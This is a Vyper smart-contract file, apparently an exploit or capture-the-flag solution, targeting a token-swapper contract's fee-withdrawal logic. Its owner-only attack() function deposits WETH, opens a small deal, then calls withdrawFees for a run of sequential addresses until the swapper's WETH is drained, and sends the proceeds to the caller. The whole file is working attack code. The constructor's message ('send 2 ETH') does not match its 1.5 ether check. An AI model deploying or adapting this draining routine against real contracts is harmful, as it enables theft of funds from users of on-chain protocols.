# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20

interface ISwapper:
    def p2pweth() -> address: view
    def partnerFees(x: uint256) -> uint256: view
    def withdrawFees(user: address) -> uint256: nonpayable 

owner: immutable(address)

swapper: ISwapper
weth: address

@external
@payable
def __init__(_swapper: ISwapper):
    assert msg.value >= as_wei_value(1.5, "ether"), "send 2 ETH"
    owner = msg.sender
    self.swapper = _swapper
    self.weth = self.swapper.p2pweth()

@external
def attack():
    assert msg.sender == owner, "!owner"
    raw_call(
        self.weth,
        method_id("deposit()"),
        value=as_wei_value(1, "ether"),
    )
    IERC20(self.weth).approve(self.swapper.address, max_value(uint256))
    raw_call(
        self.swapper.address,
        _abi_encode(
           self.weth,
           convert(1_000_000, uint256),
           self.weth,
           convert(1_000_000, uint256),
           method_id=method_id(
                "createDeal(address,uint256,address,uint256)"
           )
        ),
        value=2_000_000,
    )
    for i in range(max_value(uint8)):
        if IERC20(self.weth).balanceOf(self.swapper.address) > 0:
            addr: address = convert(i, address)
            self.swapper.withdrawFees(addr)
        else:
            break
    send(msg.sender, self.balance)

@external
@payable
def __default__():
    pass
